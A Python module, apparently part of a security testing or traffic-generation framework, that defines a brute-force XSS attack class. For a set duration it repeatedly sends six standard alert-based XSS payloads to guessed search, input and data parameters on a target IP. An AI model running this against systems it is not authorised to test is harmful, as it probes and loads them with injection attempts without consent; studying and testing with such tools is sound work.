"""XSS Brute Force attack implementation"""

import asyncio
import aiohttp
import logging
import urllib.parse
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class BruteForceXSS(BaseAttack):
    """XSS brute force attack - trying XSS payloads"""
    
    def get_attack_type(self) -> str:
        return "Brute Force -XSS"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _try_xss(self, session, payload):
        """Try XSS payload"""
        port = self.target_port or self.get_default_port()
        
        # Try different injection points
        urls = [
            f"http://{self.target_ip}:{port}/search?q={urllib.parse.quote(payload)}",
            f"http://{self.target_ip}:{port}/?input={urllib.parse.quote(payload)}",
            f"http://{self.target_ip}:{port}/page?data={urllib.parse.quote(payload)}"
        ]
        
        for url in urls:
            try:
                async with session.get(url, timeout=5) as response:
                    await response.read()
                    self.packets_sent += 1
            except Exception:
                pass
    
    async def _execute_attack(self):
        """Execute XSS brute force"""
        duration = self.parameters.get('duration', 300)
        
        # Common XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>"
        ]
        
        logger.info(f"BruteForce-XSS: Starting XSS attack on {self.target_ip}")
        
        async with aiohttp.ClientSession() as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = [self._try_xss(session, payload) for payload in payloads]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 100 == 0:
                    logger.info(f"BruteForce-XSS: {self.packets_sent} attempts")
                
                await asyncio.sleep(1)
        
        logger.info(f"BruteForce-XSS: Attack complete. Total attempts: {self.packets_sent}")

